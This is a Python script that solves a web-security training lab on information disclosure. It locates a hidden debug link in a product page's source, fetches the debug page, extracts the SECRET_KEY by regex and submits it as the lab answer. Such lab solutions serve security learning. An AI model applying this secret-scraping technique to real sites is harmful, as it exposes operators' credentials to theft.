####################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 2/9/2023
#
# Lab: Information disclosure on debug page
#
# Steps: 1. Check the source code of a product page
#        2. GET the href of the commented a tag named "Debug"
#        3. Extract the secret key
#        4. submit solution
#
####################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this to your lab URL
url = "https://0ae700fb032623468425487000c70042.web-security-academy.net"

try:
    inject_payload = requests.get(
        f"{url}/product?productId=4")  # check the source code of a product page
    if inject_payload.status_code == 200:  # if response is OK
        print(Fore.WHITE + "1. Checking the source code.. " + Fore.GREEN + "OK")
        debug_path = re.findall("href=(.*)>Debug",
                                inject_payload.text)[0]  # extract the debug path; change this if it's changed in you cases
        print(Fore.WHITE + "2. Extracting the debug path.. " +
              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + debug_path)
        try:  # try to get the debug page
            debug_page = requests.get(f"{url}{debug_path}")
            if debug_page.status_code == 200:  # if fetching the debug page is OK
                print(Fore.WHITE + "3. Fetching the debug page.. " +
                      Fore.GREEN + "OK")
                secret_key = re.findall(
                    "SECRET_KEY.*class=\"v\">(.*) <", debug_page.text)[0]  # extract the secret key
                print(Fore.WHITE + "4. Extracting the secret key.. " +
                      Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + secret_key)
            try:  # try to submit solution
                data = {
                    "answer": secret_key
                }
                submit_answer = requests.post(
                    f"{url}/submitsolution", data)  # submit solution
                if submit_answer.status_code == 200:
                    print(Fore.WHITE + "5. Submitting solution.. " +
                          Fore.GREEN + "OK")
                    print(
                        Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")

            except:
                print(
                    Fore.RED + "[!] Failed to submit solution through exception")
        except:
            print(
                Fore.RED + "[!] Failed to get the debug page through exception")
except:
    print(Fore.RED + "[!] Failed to inject the payload through exception")
